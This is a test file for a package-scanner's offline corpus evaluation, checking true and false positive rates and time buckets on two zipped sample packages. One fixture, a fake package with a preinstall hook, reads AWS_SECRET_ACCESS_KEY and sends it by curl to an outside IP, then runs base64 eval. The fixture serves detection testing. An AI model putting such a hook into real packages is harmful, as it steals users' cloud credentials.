/**
 * `evaluate --corpus-dir` tests — offline re-scan of a local archive at HEAD.
 *
 * Builds a tiny corpus of .zip package archives (adm-zip, no `tar` — avoids the
 * Windows tar flake) with sidecar metadata carrying labels + first_seen dates,
 * then drives evaluateCorpusDir() directly and asserts the rolled-up TPR/FPR,
 * score distribution, and time-stratification. Output is redirected to a temp
 * dir (MUADDIB_CORPUS_OUT_DIR) so the run never litters repo metrics/.
 */

const fs = require('fs');
const path = require('path');
const os = require('os');
const AdmZip = require('adm-zip');
const { test, asyncTest, assert } = require('../test-utils');
const { evaluateCorpusDir } = require('../../src/commands/evaluate.js');

const MALICIOUS_STEAL =
  "const cp=require('child_process');" +
  "const t=process.env.AWS_SECRET_ACCESS_KEY;" +
  "cp.exec('curl http://185.220.101.5/x?d='+t);" +
  "eval(Buffer.from('Y29uc29sZS5sb2co','base64').toString());";

function buildCorpus({ withLabels = true } = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-corpus-test-'));
  const write = (name, ver, files, sidecar) => {
    const z = new AdmZip();
    for (const [f, c] of Object.entries(files)) z.addFile('package/' + f, Buffer.from(c, 'utf8'));
    z.writeZip(path.join(dir, `${name}-${ver}.zip`));
    if (sidecar) fs.writeFileSync(path.join(dir, `${name}-${ver}.json`), JSON.stringify(sidecar));
  };
  // Malicious, dated 2026 → "current" bucket.
  write('evil-fetch', '1.0.0', {
    'package.json': JSON.stringify({ name: 'evil-fetch', version: '1.0.0', scripts: { preinstall: 'node steal.js' } }),
    'steal.js': MALICIOUS_STEAL
  }, withLabels ? { package: 'evil-fetch', version: '1.0.0', timestamp: '2026-06-01T00:00:00Z', label: 'malicious' }
                : { package: 'evil-fetch', version: '1.0.0', timestamp: '2026-06-01T00:00:00Z' });
  // Clean, dated 2024 → "historical" bucket.
  write('nice-lib', '2.3.1', {
    'package.json': JSON.stringify({ name: 'nice-lib', version: '2.3.1' }),
    'index.js': 'module.exports = function add(a,b){ return a+b; };'
  }, withLabels ? { package: 'nice-lib', version: '2.3.1', timestamp: '2024-03-01T00:00:00Z', label: 'clean' }
                : { package: 'nice-lib', version: '2.3.1', timestamp: '2024-03-01T00:00:00Z' });
  return dir;
}

async function withTmpOut(fn) {
  const outDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-corpus-out-'));
  const prev = process.env.MUADDIB_CORPUS_OUT_DIR;
  process.env.MUADDIB_CORPUS_OUT_DIR = outDir;
  try { return await fn(outDir); }
  finally {
    if (prev === undefined) delete process.env.MUADDIB_CORPUS_OUT_DIR; else process.env.MUADDIB_CORPUS_OUT_DIR = prev;
    try { fs.rmSync(outDir, { recursive: true, force: true }); } catch { /* ok */ }
  }
}

function cleanupDir(dir) {
  try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* ok */ }
}

function runEvaluateCorpusDirTests() {
  console.log('\n=== EVALUATE --corpus-dir TESTS ===\n');

  asyncTest('CORPUS-01: labeled corpus → TPR/FPR + time buckets, re-scanned at HEAD', async () => {
    const dir = buildCorpus({ withLabels: true });
    try {
      const r = await withTmpOut(() => evaluateCorpusDir(dir, { json: true }));
      assert(r.total === 2, `expected 2 samples, got ${r.total}`);
      assert(r.scanned === 2, `expected 2 scanned, got ${r.scanned} (skipped ${r.skipped})`);
      assert(r.flagged === 1, `expected 1 flagged (the malware), got ${r.flagged}`);
      assert(r.labeled, 'expected labeled stats when labels present');
      assert(r.labeled.tpr === 1, `expected TPR 1.0 (malware detected), got ${r.labeled.tpr}`);
      assert(r.labeled.fpr === 0, `expected FPR 0 (clean not flagged), got ${r.labeled.fpr}`);
      // Time-stratification: malware in "current" (2026), clean in "historical" (2024).
      assert(r.byTimeBucket.current && r.byTimeBucket.current.total === 1, 'expected 1 sample in the current bucket');
      assert(r.byTimeBucket.historical && r.byTimeBucket.historical.total === 1, 'expected 1 sample in the historical bucket');
      assert(r.byTimeBucket.current.labeled.tpr === 1, 'current bucket TPR should be 1');
    } finally {
      cleanupDir(dir);
    }
  });

  asyncTest('CORPUS-02: no labels → score distribution + flagged rate, labeled=null (honest)', async () => {
    const dir = buildCorpus({ withLabels: false });
    try {
      const r = await withTmpOut(() => evaluateCorpusDir(dir, { json: true }));
      assert(r.scanned === 2, `expected 2 scanned, got ${r.scanned}`);
      assert(r.labeled === null, 'without labels, TPR/FPR must be null (archive stores a score, not a verdict)');
      assert(r.flagged === 1, `expected 1 flagged, got ${r.flagged}`);
      assert(r.scoreDistribution['50+'] === 1, 'the malware should land in the 50+ score bucket');
      assert(r.scoreDistribution['0'] === 1, 'the clean lib should land in the 0 score bucket');
    } finally {
      cleanupDir(dir);
    }
  });

  asyncTest('CORPUS-03: labels.json map is honored when no sidecar label is present', async () => {
    const dir = buildCorpus({ withLabels: false });
    fs.writeFileSync(path.join(dir, 'labels.json'), JSON.stringify({ 'evil-fetch@1.0.0': 'malicious', 'nice-lib@2.3.1': 'clean' }));
    try {
      const r = await withTmpOut(() => evaluateCorpusDir(dir, { json: true }));
      assert(r.labeled, 'labels.json should produce labeled stats');
      assert(r.labeled.malicious === 1 && r.labeled.clean === 1, 'expected 1 malicious + 1 clean from labels.json');
      assert(r.labeled.tpr === 1 && r.labeled.fpr === 0, `expected TPR 1 / FPR 0, got ${r.labeled.tpr}/${r.labeled.fpr}`);
    } finally {
      cleanupDir(dir);
    }
  });

  asyncTest('CORPUS-04: missing corpus dir throws a clear error', async () => {
    let threw = false;
    try { await evaluateCorpusDir(path.join(os.tmpdir(), 'muaddib-does-not-exist-xyz-123'), { json: true }); }
    catch (e) { threw = true; assert(/not found/i.test(e.message), `expected "not found" error, got: ${e.message}`); }
    assert(threw, 'evaluateCorpusDir must throw on a missing corpus dir');
  });
}

module.exports = { runEvaluateCorpusDirTests };
